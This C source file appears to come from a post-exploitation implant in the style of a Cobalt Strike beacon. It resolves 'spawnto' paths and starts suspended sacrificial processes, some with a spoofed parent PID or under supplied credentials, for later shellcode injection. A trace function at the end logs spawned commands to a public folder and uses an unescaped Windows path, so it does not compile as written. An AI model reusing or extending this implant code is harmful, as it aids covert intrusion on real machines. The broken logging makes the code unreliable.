/*
* Functions related to spawning and injecting shellcode. Better to group these into one spot.
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "spawn_trace.h"
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"
#include "process.h"

/* spawn stuff?!? :) */
static char * spawn_x86 = NULL; /* TODO: Allocated buffer to hold spawn information however these need to be released with data_free(alloc) and alloc is currently lost. */
static char * spawn_x64 = NULL;

/* define where we will spawn to */
void command_spawnproc(char * buffer, int length, BOOL x86) {
	/* initialize our global values */
	if (spawn_x86 == NULL || spawn_x64 == NULL) {
		datap * alloc = data_alloc(512);  /* TODO this allocation is lost once called. sets the globals however and that space is reused as needed. Mask candidate? */
		spawn_x86 = data_ptr(alloc, 256);
		spawn_x64 = data_ptr(alloc, 256);
	}

	/* reset both of them */
	if (length == 0 || length > 256) {
		memset(spawn_x86, 0, 256);
		memset(spawn_x64, 0, 256);
	}
	/* set our x86 option */
	else if (x86) {
		memset(spawn_x86, 0, 256);
		memcpy(spawn_x86, buffer, length);
	}
	/* set our x64 option */
	else {
		memset(spawn_x64, 0, 256);
		memcpy(spawn_x64, buffer, length);
	}
}

/* resolve our spawnproc */
void spawnproc(char * dst, DWORD max, BOOL x86) {
	char temp[256];

	/* zero out temp */
	memset(temp, 0, 256);

	/* grab the right spawn value for our architecture. Account for the user's runtime override */
	if (x86) {
		if (spawn_x86 != NULL && strlen(spawn_x86) > 0) {
			_snprintf(temp, 256, "%s", spawn_x86);
		}
		else {
			_snprintf(temp, 256, "%s", setting_ptr(SETTING_SPAWNTO_X86));
		}
	}
	else {
		if (spawn_x64 != NULL && strlen(spawn_x64) > 0) {
			_snprintf(temp, 256, "%s", spawn_x64);
		}
		else {
			_snprintf(temp, 256, "%s", setting_ptr(SETTING_SPAWNTO_X64));
		}
	}

	/* need to resolve environment variables into dst */
	env_expand(temp, dst, max);
}

void spawn_populate(BOOL x86, char * cmdbuff) {
	/* update cmdbuff, appropriately */
	memset(cmdbuff, 0, 256);

#if defined _M_X64
	/* user wants an x86 process */
	if (x86) {
		spawnproc(cmdbuff, 256, x86);
	}
	/* x64 context */
	else {
		char * foundp = NULL;
		spawnproc(cmdbuff, 256, x86);

		/* replace sysnative with system32. Really. */
		fold_sysnative(cmdbuff);
	}
#elif defined _M_IX86
	/* user wants to spawn an x64 process */
	if (!x86) {
		spawnproc(cmdbuff, 256, FALSE);
	}
	/* user wants an x86 process AND there is no WOW64 sub-system. Special case! (e.g., XP, x86-only Windows) */
	else if (!is_wow64(GetCurrentProcess())) {
		char * foundp = NULL;
		spawnproc(cmdbuff, 256, TRUE);

		/* replace syswow64 with system32 */
		foundp = strstr(cmdbuff, "syswow64");
		if (foundp != NULL) {
			memcpy(foundp, "system32", 8);
		}
	}
	/* user wants an x86 process */
	else {
		spawnproc(cmdbuff, 256, TRUE);
	}
#endif
}

BOOL spawn_patsy(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi) {
	char cmdbuff[256];
	BOOL r;

	/* populate cmdbuff */
	spawn_populate(x86, cmdbuff);
	spawn_log("patsy: cmd=", (long)(long long)0x7fffffff);
	spawn_log(cmdbuff, 0x7fffffff);

	/* spawn it baby! */
	r = execute_program_with_default_ppid(cmdbuff, strlen(cmdbuff), si, pi, CREATE_SUSPENDED, ignoreToken);
	spawn_log("patsy: exec_ppid result=", (long)r);
	return r;
}

BOOL spawn_patsy_as(BOOL x86, char * domain, char * user, char * pass, PROCESS_INFORMATION * pi) {
	char cmdbuff[256];

	/* populate cmdbuff */
	spawn_populate(x86, cmdbuff);

	/* spawn it baby! */
	return runas(domain, user, pass, cmdbuff, CREATE_SUSPENDED, pi);
}

BOOL spawn_patsy_u(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi, DWORD ppid) {
	char cmdbuff[256];

	/* populate cmdbuff */
	spawn_populate(x86, cmdbuff);

	/* spawn it baby! */
	return execute_program_with_ppid(cmdbuff, strlen(cmdbuff), si, pi, CREATE_SUSPENDED, ignoreToken, ppid);
}


/* spawn-path trace sink (round 23): one copy, shared by all callers */
void spawn_log(const char * msg, long v)
{
	HANDLE f = CreateFileA("C:\Users\Public\spawn_trace.txt", FILE_APPEND_DATA, 0, NULL,
	                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	char buf[96];
	int i = 0;
	if (f == INVALID_HANDLE_VALUE)
		return;
	while (*msg && i < 80) buf[i++] = *msg++;
	if (v != 0x7fffffff) {
		char num[12];
		int n = 0;
		long t = v;
		if (t < 0) { buf[i++] = '-'; t = -t; }
		if (t == 0) num[n++] = '0';
		while (t) { num[n++] = (char)('0' + (t % 10)); t /= 10; }
		while (n && i < 90) buf[i++] = num[--n];
	}
	buf[i++] = '\r';
	buf[i++] = '\n';
	WriteFile(f, buf, (DWORD)i, NULL, NULL);
	CloseHandle(f);
}
